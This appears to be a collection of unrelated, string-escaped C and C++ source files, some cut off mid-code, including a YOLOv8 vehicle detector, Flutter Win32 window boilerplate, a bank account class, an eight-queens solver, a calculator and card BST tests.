\"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << doubleArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST FLOAT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    float floatArray[] = {1.1f, 2.2f, 3.3f, 4.4f, 5.5f};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << floatArray[i] << std::endl;\n    }\n    iter(floatArray, 5, square);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << floatArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST STRING ARRAY 1:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::string stringArray[] = {\"hello\", \"world\", \"how\", \"are\", \"you\"};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    iter(stringArray, 5, addExclamation);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST STRING ARRAY 2:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    iter(stringArray, 5, capitalize);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n}\n",
    "//\n// Created by ubuntu on 1/20/23.\n//\n#include \"chrono\"\n#include \"yolov8.hpp\"\n#include \"opencv2/opencv.hpp\"\n\nconst std::vector<std::string> CLASS_NAMES = {\n\t\"car\", \"motorcycle\"};\n\nconst std::vector<std::vector<unsigned int>> COLORS = {\n\t{ 0, 255, 0 }, { 0, 0, 255 }\n};\n\n// Function to generate the GStreamer pipeline string\nstd::string gstreamer_pipeline (int capture_width, int capture_height, int display_width, int display_height, int framerate, int flip_method) {\n    return \"nvarguscamerasrc ! video/x-raw(memory:NVMM), width=(int)\" + std::to_string(capture_width) + \", height=(int)\" +\n           std::to_string(capture_height) + \", framerate=(fraction)\" + std::to_string(framerate) +\n           \"/1 ! nvvidconv flip-method=\" + std::to_string(flip_method) + \" ! video/x-raw, width=(int)\" + std::to_string(display_width) + \", height=(int)\" +\n           std::to_string(display_height) + \", format=(string)BGRx ! videoconvert ! video/x-raw, format=(string)BGR ! appsink\";\n}\n\nint main(int argc, char** argv) {\n    // Read command line arguments\n    const std::string engine_file_path{argv[1]};\n    const std::string input_type{argv[2]};\n    std::string input_value;\n    int infer_rate;\n    std::string output_type;\n\n    // Variables for video processing\n    std::vector<std::string> imagePathList;\n    bool isVideo{false};\n    bool isCamera{false};\n\n    // Create an instance of the YOLOv8 object detector\n    auto yolov8 = new YOLOv8(engine_file_path);\n    yolov8->make_pipe(true);\n\n    // Process based on input type\n    if (input_type == \"video\") {\n        assert(argc == 6);\n        input_value = argv[3];\n        infer_rate = std::stoi(argv[4]);\n        output_type = argv[5];\n        if (IsFile(input_value)) {\n            std::string suffix = input_value.substr(input_value.find_last_of('.') + 1);\n            // Check if the input video file has a supported format\n            if (suffix == \"mp4\" || suffix == \"avi\" || suffix == \"m4v\" || suffix == \"mpeg\" || suffix == \"mov\" || suffix == \"mkv\") {\n                isVideo = true;\n            } else {\n                printf(\"suffix %s is wrong !!!\\n\", suffix.c_str());\n                std::abort();\n            }\n        }\n    } else if (input_type == \"camera\") {\n        assert(argc == 5);\n        infer_rate = std::stoi(argv[3]);\n        output_type = argv[4];\n        isCamera = true;\n    }\n\n    // Initialize OpenCV video capture and video writer\n    cv::VideoCapture cap;\n    cv::VideoWriter writer;\n    if (isVideo) {\n        cap.open(input_value);\n        if (!cap.isOpened()) {\n            printf(\"can not open %s\\n\", input_value.c_str());\n            return -1;\n        }\n\n        // Get video frame size\n        cv::Size size = cv::Size((int)cap.get(cv::CAP_PROP_FRAME_WIDTH), (int)cap.get(cv::CAP_PROP_FRAME_HEIGHT));\n        if (output_type == \"save\") {\n            // Generate a new filename for the output video\n            auto t = std::time(nullptr);\n            auto tm = *std::localtime(&t);\n            std::ostringstream oss;\n            oss << std::put_time(&tm, \"%Y-%m-%d_%H-%M-%S\");\n            auto str = oss.str();\n            size_t lastindex = input_value.find_last_of(\".\");\n            size_t lastSlash = input_value.find_last_of('/');\n            size_t lastDot = input_value.find_last_of('.');\n            std::string rawname = input_value.substr(lastSlash + 1, lastDot - lastSlash - 1);\n            std::string new_filename = rawname + \"_detection_\" + str + \".mp4\";\n            writer.open(new_filename, cv::VideoWriter::fourcc('m', 'p', '4', 'v'), 30, size);\n        }\n    } else {\n        // Settings for camera input\n        int capture_width = 1280;\n        int capture_height = 720;\n        int display_width = 1280;\n        int display_height = 720;\n        int framerate = 30;\n        int flip_method = 2;\n\n        // Generate the GStreamer pipeline string\n        std::string pipeline = gstreamer_pipeline(capture_width, capture_height, display_width, display_height, framerate, flip_method);\n        std::cout << \"Using pipeline: \\n\\t\" << pipeline << \"\\n\";\n\n        // Open the camera using the GStreamer pipeline\n        cap.open(pipeline, cv::CAP_GSTREAMER);\n        if (!cap.isOpened()) {\n            std::cout << \"Failed to open camera.\" << std::endl;\n            return -1;\n        }\n\n        // Get camera frame size\n        cv::Size size = cv::Size((int)cap.get(cv::CAP_PROP_FRAME_WIDTH), (int)cap.get(cv::CAP_PROP_FRAME_HEIGHT));\n        if (output_type == \"save\") {\n            // Generate a new filename for the output video\n            auto t = std::time(nullptr);\n            auto tm = *std::localtime(&t);\n            std::ostringstream oss;\n            oss << std::put_time(&tm, \"%Y-%m-%d_%H-%M-%S\");\n            auto str = oss.str();\n            size_t lastindex = input_value.find_last_of(\".\");\n            std::string rawname = input_value.substr(0, lastindex);\n            std::string new_filename = \"Camera_detection_\" + str + \".mp4\";\n            writer.open(new_filename, cv::VideoW",
    "#include \"win32_window.h\"\n\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::CreateAndShow(const std::wstring& title,\n                                const Point& origin,\n                                const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW | WS_VISIBLE,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  return OnCreate();\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    SetWindowLongPtr(window, GWLP_USERDATA,\n                     reinterpret_cast<LONG_PTR>(window_struct->lpCreateParams));\n\n    auto that = static_cast<Win32Window*>(window_struct->lpCreateParams);\n    EnableFullDpiSupportIfAvailable(window);\n    that->window_handle_ = window;\n  } else if (Win32Window* that = GetThisFromHandle(window)) {\n    return that->MessageHandler(window, message, wparam, lparam);\n  }\n\n  return DefWindowProc(window, message, wparam, lparam);\n}\n\nLRESULT\nWin32Window::MessageHandler(HWND hwnd,\n                            UINT const message,\n                            WPARAM const wparam,\n                            LPARAM const lparam) noexcept {\n  switch (message) {\n    case WM_DESTROY:\n      window_handle_ = nullptr;\n      Destroy();\n      if (quit_on_close_) {\n        PostQuitMessage(0);\n  ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"Account.h\"\n\nusing namespace std;\n\nvoid Account::deposit(double amount)\n{\n  // Let's say deposit amount has a limit of $1500\n  // We ensure they can only depsosit a valid amount\n  if (amount <= 0) {\n    std::cerr << \"The amount you would like to deposit must be greater than 0.\\n\";\n  }\n  else if (amount > 1500.0) {\n    std::cerr << \"You can't go over your deposit limit of $1500.\\n\";\n  }\n  else {\n    balance += amount;\n    std::cout << \"You have successfully withdrawed $\" << setprecision(2) << amount << '\\n';\n    std::cout << \"Balance: \" << balance;\n  }\n}\n\nvoid Account::withdraw(double amount)\n{\n  // A user can only withdraw if the amount is less than their balance\n  // and their balance is greater than 0\n  if (amount <= 0) {\n    std::cerr << \"The amount you would like to withdraw must be greater than 0.\\n\";\n  }\n  else if (balance <= 0) {\n    std::cerr << \"Your balance must be greater than $0.\\n\";\n  }\n  else if (amount > balance) {\n    std::cerr << \"You do not have enough funds for this transaction\\n\";\n  }\n  else {\n    balance -= amount;\n    std::cout << \"You have successfully withdrawed $\" << setprecision(2) << amount << '\\n';\n    std::cout << \"Balance: \" << balance;\n  }\n}\n\ndouble Account::getBalance() const\n{\n  return balance;\n}\n\nint Account::getAccountNumber() const\n{\n  return accountNumber;\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nbool findQueenSpot(int[8][8], int, int, int);\nvoid print2DArray(int[8][8]);\n\nint main()\n{\n    int firstQueenRow = 0;\n    int firstQueenColumn = 0;\n\n    int chessBoardArray[8][8] = {0};\n\n    //Taking first queen input\n    cout << \"Enter initial coordinates of the first queen: \";\n    \n    //get two int inputs\n    cin >> firstQueenRow;\n    cin >> firstQueenColumn;\n\n    cout << firstQueenRow << \" \" << firstQueenColumn << endl << endl;\n\n    firstQueenRow--;\n    firstQueenColumn--;\n \n    chessBoardArray[firstQueenRow][firstQueenColumn] = 1;   //set first queen pos in array\n\n    //Recursive calls\n    findQueenSpot(chessBoardArray, 0, 0, firstQueenRow); //start at [0,0]\n\n    return 0;\n}\n\nbool findQueenSpot(int arr[8][8], int row, int col, int userQueen)\n{\n    if (row == userQueen)   //if current row is the user placed queen, go next row\n    {\n        if (row == 7)   //if the user queen row is the last row, prevented printing multiple times.\n        {\n            print2DArray(arr);\n            return 1;\n        }\n        findQueenSpot(arr, row+1, 0, userQueen);  //next row call\n    }\n\n    if (row >= 8)    //if the row passed is >= 8, that means all rows were filled with queen, therefore can print and return \n    {\n        print2DArray(arr);\n        return 1;\n    }\n\n    columnCheck:\n    //check if there is already a queen in the column\n    int colCheckInt = 0;\n    while (colCheckInt < 8)\n    {\n        if (col >= 8)   //if theres no where to place, failed. \n        {\n            return 0;  \n        }\n        if (arr[colCheckInt][col] == 1)     //if there is a queen\n        {\n            //Column is complete, go next column\n            col++;\n            colCheckInt = 0;\n        }\n        else\n        {\n            colCheckInt++;\n        }\n    }\n\n    //check for diagonals\n    int rowDiagonalCheck = row;\n    int colDiagonalCheck = col;\n    rowDiagonalCheck--;\n    colDiagonalCheck--;\n    while (rowDiagonalCheck >= 0 && colDiagonalCheck >= 0)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the neg neg diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck--;\n        colDiagonalCheck--;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck--;\n    colDiagonalCheck++;\n    while (rowDiagonalCheck >= 0 && colDiagonalCheck < 8)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the neg pos diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck--;\n        colDiagonalCheck++;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck++;\n    colDiagonalCheck--;\n    while (rowDiagonalCheck < 8 && colDiagonalCheck >= 0)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the pos neg diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck++;\n        colDiagonalCheck--;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck++;\n    colDiagonalCheck++;\n    while (rowDiagonalCheck < 8 && colDiagonalCheck < 8)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the pos pos diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck++;\n        colDiagonalCheck++;\n    }\n\n    //no queens in row, column, or diagonals, can place queen here.\n    arr[row][col] = 1;\n    //findQueenSpot(arr, row+1, 0, userQueen, queenCount);\n    if (findQueenSpot(arr, row+1, 0, userQueen) == 0) //if the call returned false, remove the just placed queen and try next column\n    {\n        arr[row][col] = 0;\n        col++;\n        goto columnCheck;\n    }\n\n    return 1;\n}\n\nvoid print2DArray(int arr[8][8])\n{\n    int colCounter = 1;\n    int tmpRow = 0;\n    cout << \"   1  2  3  4  5  6  7  8\" << endl; //first row\n    for (int i = 0; i < 8; i++) //for every row that you need to print\n    {\n        int j = 0;  //column counter\n        cout << colCounter << \"  \";     //print the row#\n        while (j < 8)    // in each column, check if queen is in spot & print, otherwise print '-'\n        {\n            if (arr[i][j] == 1) //if value in array is 1, its a queen\n                cout << \"Q\";\n            else                            //otherwise, its an empty space\n                cout << \"-\";\n            cout << \"  \";                   //spacing\n            j++;                            //increment col counter\n        }\n        cout << endl;\n        colCounter++;\n    }\n}",
    "#include<stdio.h>\nvoid funcmul(int*,int*,int*);\nvoid funcdiv(int*,int*,int*);\nvoid funcadd(int*,int*,int*);\nvoid funcsub(int*,int*,int*);\nint main()\n{\n    int mul,sub,div,add;\n     int n1,n2;\n     char op;\n     printf(\"Enter your  first Number :\\n\");\n     scanf(\"%d\",&n1);\n      printf(\"Enter The Operator(*,-,+,/):\\n\");\n     scanf(\" %c\",&op);\n     printf(\"Enter your Second Number:\\n\");\n     scanf(\"%d\",&n2);\n\n\n     if(op=='*'){\n        funcmul(&n1,&n2,&mul);\n        printf(\"Multiplication=%d\",mul);\n        return 0;\n     }if(op=='/'){\n       funcdiv(&n1,&n2,&div);\n         printf(\"Division=%d\",div);\n         return 0;\n     }if(op=='+'){\n      funcadd(&n1,&n2,&add);\n        printf(\"Addition=%d\",add);\n        return 0;\n     }if(op=='-'){\n      funcsub(&n1,&n2,&sub);\n        printf(\"Subtraction=%d\",sub);\n        return 0;\n     }else{\n       printf(\"Invalid\");\n       return 0;\n     }\n\n}\nvoid funcmul(int* n1,int* n2,int* mul){\n\n      *mul=*n1 * *n2;\n}\nvoid funcadd(int* n1,int* n2,int* add){\n\n      *add=*n1 + *n2;\n}\n\nvoid funcsub(int* n1,int* n2,int* sub){\n\n      *sub=*n1 - *n2;\n}\n\nvoid funcdiv(int* n1,int* n2,int* div){\n\n      *div=*n1 / *n2;\n}\n\n\n\n\n",
    "// tests.cpp\r\n// Author: Margaux Blondel\r\n// These files should contain test code for all the classes and methods you used in your game. We recommend at least 5 test cases for each public member function.\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <cstring>\r\n#include \"cards.h\"\r\n#include \"utility.h\"\r\n\r\nusing namespace std;\r\n\r\n/*\r\nc, d, s, h\r\na, 2,3, 4, 5, 6, 7, 8, 9, 10, j, q, k\r\n*/\r\n\r\nint main(int argv, char** argc){\r\n    \r\n    cout << endl << \"---------------TESTS----------------\" << endl;\r\n\r\n    // cards tests\r\n    cout << endl << \"---------------CARDS----------------\";\r\n    \r\n    // create cards\r\n    cout << endl << \"Create card : c a\";\r\n    Card a('c',\"a\");\r\n    a.printControl();\r\n\r\n    cout << endl << \"Create card : h 10\";\r\n    Card b('h',\"10\");\r\n    b.printControl();\r\n\r\n    cout << endl << \"Create card : c 10\";\r\n    Card c('c',\"10\");\r\n    c.printControl();\r\n\r\n    cout << endl << \"Create card : d q\";\r\n    Card d('d',\"q\");\r\n    d.printControl();\r\n\r\n    //Copy constructor\r\n    cout << endl << \"Create card : h q\";\r\n    Card e('h',\"q\");\r\n    e.printControl();\r\n    cout << endl << \"Create a copie : \";\r\n    Card f(e);\r\n    f.printControl();\r\n    cout << endl << \"Create a copie : \";\r\n    Card g=f;\r\n    g.printControl();\r\n    g=e;\r\n    g.printControl();\r\n    \r\n    // operators cards\r\n    \r\n    // <\r\n    cout << endl << \"c 10 < c a ?   : \" ;\r\n    cout << (c < a) << \" (except false)\";\r\n\r\n    cout << endl << \"c 10 < h 10 ?  : \" ;\r\n    cout << (c < b) << \" (except true)\";\r\n    \r\n    cout << endl << \"c a < c a ?    : \" ;\r\n    cout << (a < a) << \" (except false)\";\r\n    \r\n    // >\r\n    cout << endl << \"c 10 > c a ?   : \" ;\r\n    cout << (c > a) << \" (except true)\";\r\n\r\n    cout << endl << \"c 10 > h 10 ?  : \" ;\r\n    cout << (c > b) << \" (except false)\";\r\n    \r\n    cout << endl << \"c a > c a ?    : \" ;\r\n    cout << (a > a) << \" (except false)\";\r\n    \r\n    // ==\r\n    cout << endl << \"c 10 == c a ?  : \" ;\r\n    cout << (c == a) << \" (except false)\";\r\n\r\n    cout << endl << \"c 10 == h 10 ? : \" ;\r\n    cout << (c == b) << \" (except false)\";\r\n\r\n    cout << endl << \"c a == c a ?   : \" ;\r\n    cout << (a == a) << \" (except true)\";\r\n\r\n    cout << endl << \"-------------END-CARDS--------------\" << endl;\r\n\r\n    // BST tests\r\n    cout << endl << \"---------------CARDBST--------------\";\r\n\r\n    cout << endl << \"Create BST : c a , h 10, c 10\" ;\r\n    \r\n    // create a tree\r\n    CardsBST tree;\r\n    tree.insert(a);\r\n    tree.insert(b);\r\n    tree.insert(c);\r\n    cout << endl << \"PreOrder   : \";\r\n    tree.printPreOrder();\r\n    cout << endl << \"InOrder    : \";\r\n    tree.printInOrder();\r\n\r\n    // number of Node in the tree\r\n    cout << endl << \"Number of Node : \" << tree.count();\r\n\r\n    //Predecessor and sucessor\r\n    cout << endl << \"Values      : \" ;\r\n    Card listCards[3]={a, b, c};\r\n    for (Card ca : listCards){\r\n        ca.print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    cout << endl << \"Predecessor : \";\r\n    for (Card ca : listCards){\r\n        tree.getPredecessor(ca).print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    cout << endl << \"Successor   : \";\r\n    for (Card ca : listCards){\r\n        tree.getSuccessor(ca).print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    cout << endl << \"Values order : \" ;\r\n    for (int i=1; i<5; i++){\r\n        tree.cardInPosition(i).print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    cout << endl << \"Values rever : \" ;\r\n    for (int i=1; i<5; i++){\r\n        tree.cardInPositionReverse(i).print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    // contain\r\n    cout << endl << \"contain h 10 ? : \" << tree.contains(Card('h',\"10\"));\r\n    cout << endl << \"contain h k ?  : \" << tree.contains(Card('h',\"k\"));\r\n    cout << endl << \"remove c a, Inorder  : \";\r\n    tree.remove(a);\r\n    tree.printInOrder();\r\n    cout << endl << \"remove c 10, Inorder : \";\r\n    tree.remove(b);\r\n    tree.printInOrder();\r\n    cout << endl << \"remove h 10, Inorder : \";\r\n    tree.remove(c);\r\n    tree.printInOrder();\r\n    cout << endl << \"contain h 10 ? : \" << tree.contains(Card('h',\"10\"));\r\n\r\n    cout << endl << \"-------------END-CARDBST------------\" << endl;\r\n\r\n    cout << endl << \"---------------UTILITY--------------\";\r\n    \r\n    // test getCard\r\n    string astr = \"h 10\";\r\n    cout << endl << \"Read string : h 10\";\r\n    cout << endl << \"Create card : \";\r\n    getCard(astr).print();\r\n    string bstr = \"s q\";\r\n    cout << endl << \"Read string : s q\";\r\n    cout << endl << \"Create card : \";\r\n    getCard(bstr).print();\r\n    cout << endl << \"-------------END-UTILITY------------\" << endl;\r\n\r\n    cout << endl << \"-------------END-TESTS--------------\" << endl;\r\n\r\n    return 0;\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), 